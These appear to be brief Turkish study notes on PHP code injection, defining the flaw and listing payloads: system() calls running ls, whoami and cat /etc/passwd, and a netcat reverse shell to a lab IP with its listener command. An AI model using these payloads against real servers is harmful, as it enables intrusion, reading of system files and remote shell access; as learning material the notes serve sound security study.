# Php Enjeksiyon

## PHP Kod Enjeksiyonu

- PHP Code Injection, kullanıcı girdisinin güvensiz biçimde PHP kodu olarak değerlendirilmesi sonucu saldırganın sunucu üzerinde PHP kodu çalıştırabilmesine yol açan zafiyettir.

- işlenirse sunucuda ls komutu çalıştırılır ve sonuç HTTP yanıtına aktarılıyorsa sunucudaki ilgili dizinin dosya ve klasörleri tarayıcıda görüntülenebilir.

- Hedef üzerinden:

- > system('ls');
- > ...; system("whoami") // ; PHP’de mevcut ifadeyi sonlandırır ve ardından yeni bir PHP ifadesinin başlamasına olanak tanır.
- > ...; system("cat /etc/passwd")

- Kullanıcı girdisi → PHP tarafından kod olarak çalıştırılır → ls sunucuda çalışır → çıktı tarayıcıya döner

### Netcat kullanılabilir:

- > ...; system("nc 10.0.2.4 1234 -e /bin/bash") // PHP kod enjeksiyonu/RCE bulunan test sisteminde local ip ve port girilir

- > nc -nvlp 1234 //Dinleyici tarafında çalıştırılır hedef hacklenir
